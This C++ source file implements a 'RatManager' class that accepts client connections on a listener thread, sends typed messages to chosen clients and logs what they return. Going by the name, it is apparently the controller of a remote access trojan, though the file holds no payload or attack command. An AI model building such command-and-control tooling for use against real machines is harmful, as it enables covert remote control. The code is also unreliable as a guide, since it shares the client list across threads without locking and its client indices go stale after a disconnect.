#include "RatManager.h"

#include "Trace.h"

RatManager::RatManager(
	ICommunicationFactory* factory, 
	std::unique_ptr<IConnectionListener> server
):
	_factory(factory),
	_server(std::move(server)),
	_listenThread(std::make_unique<ThreadGuard>(
		std::thread(&RatManager::Listen, this))),
	_clientCount(0),
	_isTerminationRequested(false)
{
}

RatManager::~RatManager()
{
	_isTerminationRequested = true;
}

int RatManager::GetClientCount() const
{
	return _clientCount;
}

std::vector<std::shared_ptr<ClientPipe>> RatManager::GetClients()
{
	return _clients;
}

int RatManager::Send(const int client, const MessageType type, const std::span<char> content) const
{
	return _clients[client]->GetSender()->Send(type, content);
}

void RatManager::Join()
{
	std::ranges::for_each(
		_clients, 
		[](const std::shared_ptr<ClientPipe>& client) { client->GetListener()->Join(); });
}

void RatManager::Listen()
{
	while (!_isTerminationRequested)
	{
		const auto index = std::make_shared<int>(_clientCount);

		auto client = _server->WaitForConnection();

		auto messageSender = _factory->CreateMessageSender(client.get());

		auto messageListener = _factory->CreateMessageListener(
			client.get(),
			[this, index](auto type, auto content) { OnMessage(*index, type, content); },
			[this, index]() { OnDisconnection(*index); });

		_clients.emplace_back(
			std::make_shared<ClientPipe>(
				std::move(client),
				std::move(messageSender),
				std::move(messageListener)));
		_clientCount++;
	}
}

void RatManager::OnDisconnection(const int client)
{
	_clients.erase(_clients.begin() + client);
	_clientCount--;

	Trace("Client %d | disconnected", client);
}

void RatManager::OnMessage(const int client, const MessageType type, const std::span<char> content)
{
	Trace(
		"Client %d | %d | %s\n",
		client,
		type,
		std::string(content.data(), content.size()).c_str()
	);
}
